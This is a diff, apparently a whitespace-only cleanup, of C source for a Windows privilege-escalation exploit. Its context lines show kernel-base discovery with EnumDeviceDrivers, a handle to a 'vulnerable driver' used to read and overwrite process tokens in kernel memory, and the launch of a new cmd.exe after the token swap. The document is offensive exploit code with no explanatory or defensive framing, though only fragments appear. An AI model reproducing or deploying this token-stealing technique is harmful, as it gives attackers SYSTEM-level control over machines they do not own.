@@ -115,14 +115,14 @@ _cleanUp:
 }
 
 DWORD64 GetKernelBaseAddr() {
-    
+
     DWORD dwCB = 0;
     DWORD64 dwDrivers[1024];
 
     // Retrieve the load address for each device driver in the system
     // https://learn.microsoft.com/en-us/windows/win32/api/psapi/nf-psapi-enumdevicedrivers
     if (EnumDeviceDrivers(dwDrivers, sizeof(dwDrivers), &dwCB)) {
-        
+
         // Return the first address in the list, which should be the address of Ntoskrnl
         return (DWORD64)dwDrivers[0];
     }
@@ -191,7 +191,7 @@ BOOL ReplaceToken(IN DWORD64 dwTargetPID, IN DWORD64 dwSourcePID) {
         goto _cleanUp;
     }
     info_t("GetDeviceHandle - Handle to vulnerable driver 0x%p", hDevice);
-    
+
     // Get Ntoskrnl base address
     dwKernelBase = GetKernelBaseAddr();
     if (dwKernelBase == NULL) {
@@ -280,7 +280,7 @@ BOOL ReplaceToken(IN DWORD64 dwTargetPID, IN DWORD64 dwSourcePID) {
     }
     info_t("ReadMemoryDWORD64 - Target proccess token memory location 0x%p", dwTargetProcessToken);
     info_t("ReadMemoryDWORD64 - Source proccess token memory location 0x%p", dwSourceProcessToken);
-    
+
     // Change the process token
     info_t("WriteMemoryDWORD64 - Changing token of PID %d to token of PID %d", dwTargetPID, dwSourcePID);
     WriteMemoryDWORD64(hDevice, dwTargetProcessAddress + g_Offsets.TokenOffset, dwTargetProcessTokenReferenceCounter | dwSourceProcessToken);
@@ -374,7 +374,7 @@ BOOL StartNewSystemProcess() {
     // Zero memory
     ZeroMemory(&si, sizeof(si));
     si.cb = sizeof(si);
-    ZeroMemory(&pi, sizeof(pi));        
+    ZeroMemory(&pi, sizeof(pi));
 
     // Create new cmd.exe process
     if (!CreateProcessW(
@@ -388,7 +388,7 @@ BOOL StartNewSystemProcess() {
         NULL,                                   // Current directory
         &si,                                    // Pointer to STARTUPINFO structure
         &pi                                     // Pointer to PROCESS_INFORMATION structure
-    )) {                    
+    )) {
         error("CreateProcessW - Failed to spawn process \"cmd.exe\"");
         bSTATE = FALSE;
         goto _cleanUp;
